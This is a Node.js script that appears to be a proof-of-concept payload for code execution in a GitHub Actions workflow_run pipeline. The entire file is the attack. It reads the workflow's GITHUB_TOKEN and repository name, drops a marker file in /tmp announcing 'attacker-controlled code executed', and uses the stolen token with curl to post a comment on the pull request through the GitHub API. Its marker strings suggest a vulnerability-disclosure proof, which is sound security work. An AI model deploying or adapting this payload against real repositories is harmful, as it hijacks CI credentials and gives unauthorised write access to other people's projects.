const fs = require('fs');
const { execFileSync } = require('child_process');
const token = process.env.GITHUB_TOKEN || '';
const repo = process.env.GITHUB_REPOSITORY || '';
let pr = '';
try { pr = fs.readFileSync((process.env.GITHUB_WORKSPACE || '.') + '/pr-number.txt', 'utf8').trim(); } catch (e) {}
const marker = 'GAB_RCE_PROOF_7f3c9d: attacker-controlled code executed in workflow_run consumer repo=' + repo + ' pr=' + pr + ' token=' + (token ? 'present' : 'absent');
try { fs.writeFileSync('/tmp/ADP_RCE_MARKER', marker + '\n'); } catch (e) {}
console.log(marker);
let ok = false;
if (token && repo && pr) {
  try {
    execFileSync('curl', ['-sS', '-o', '/tmp/RCE_COMMENT_OUT', '-w', '%{http_code}', '-X', 'POST',
      '-H', 'Authorization: Bearer ' + token,
      '-H', 'Accept: application/vnd.github+json',
      '-H', 'Content-Type: application/json',
      'https://api.github.com/repos/' + repo + '/issues/' + pr + '/comments',
      '-d', JSON.stringify({ body: marker })], { stdio: 'inherit' });
    ok = true;
  } catch (e) { console.error('comment failed: ' + e.message); }
}
if (ok) { console.log('COMMENT_POSTED'); process.exit(0); }
console.error('GAB_RCE_STDERR ' + marker);
process.exit(1);
